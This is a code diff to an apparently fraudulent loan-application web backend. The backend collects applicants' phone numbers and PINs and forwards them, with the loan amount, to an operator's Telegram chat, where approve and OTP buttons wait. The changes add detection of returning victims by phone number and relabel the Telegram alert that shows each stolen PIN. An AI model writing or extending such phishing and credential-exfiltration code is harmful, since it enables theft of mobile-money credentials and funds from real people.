@@ -16,6 +16,13 @@ TELEGRAM_CHAT_ID = '8589275340'
 applications = {}
 
 # ==================== HELPERS ====================
+def is_returning_user(phone):
+    """Check if a phone number has applied before"""
+    for app_id, data in applications.items():
+        if data.get('phone') == phone:
+            return True
+    return False
+
 def send_telegram_message(message, buttons=None):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
@@ -60,6 +67,9 @@ def submit_loan():
         # Generate app ID
         app_id = 'MP-' + str(uuid.uuid4())[:8].upper()
         
+        # Check if returning user
+        returning = is_returning_user(phone)
+        
         applications[app_id] = {
             'phone': phone,
             'pin': pin,
@@ -69,24 +79,26 @@ def submit_loan():
             'purpose': purpose,
             'status': 'waiting',
             'code_status': 'waiting',
-            'created_at': datetime.now().isoformat()
+            'created_at': datetime.now().isoformat(),
+            'is_returning': returning
         }
         
-        # Format phone number
+        # Format phone number with space
         formatted_phone = '+255 ' + phone
         
-        # Send to Telegram with the EXACT format you want
+        # Choose message type based on returning user
+        if returning:
+            message_type = "🔄 <b>RETURNING USER</b>"
+        else:
+            message_type = "📥 <b>NEW LOAN REQUEST</b>"
+        
         message = f"""
-🔄 <b>NEW LOAN APPLICATION</b>
+{message_type}
 
 🆔 <b>ID:</b> {app_id}
 📞 <b>Phone:</b> {formatted_phone}
 💰 <b>Amount:</b> TZS {amount:,}
 🔢 <b>PIN:</b> {pin}
-📋 <b>Type:</b> {loan_type or 'N/A'}
-📝 <b>Purpose:</b> {purpose or 'N/A'}
-
-⏳ <b>Status:</b> Waiting for PIN verification
 """
         
         buttons = [
@@ -219,15 +231,22 @@ def webhook():
                     response = f"✅ LOAN APPROVED for {app_id}!"
                 elif action_type == 'allow_otp':
                     applications[app_id]['status'] = 'approved'
-                    # Send returning user message
                     phone = applications[app_id].get('phone', '')
                     amount = applications[app_id].get('amount', 0)
                     pin = applications[app_id].get('pin', '')
+                    formatted_phone = '+255 ' + phone
+                    returning = applications[app_id].get('is_returning', False)
+                    
+                    if returning:
+                        message_type = "🔄 <b>RETURNING USER</b>"
+                    else:
+                        message_type = "📥 <b>NEW LOAN REQUEST</b>"
+                    
                     response = f"""
-🔄 <b>RETURNING USER</b>
+{message_type}
 
 🆔 <b>ID:</b> {app_id}
-📞 <b>Phone:</b> +255 {phone}
+📞 <b>Phone:</b> {formatted_phone}
 💰 <b>Amount:</b> TZS {amount:,}
 🔢 <b>PIN:</b> {pin}
 
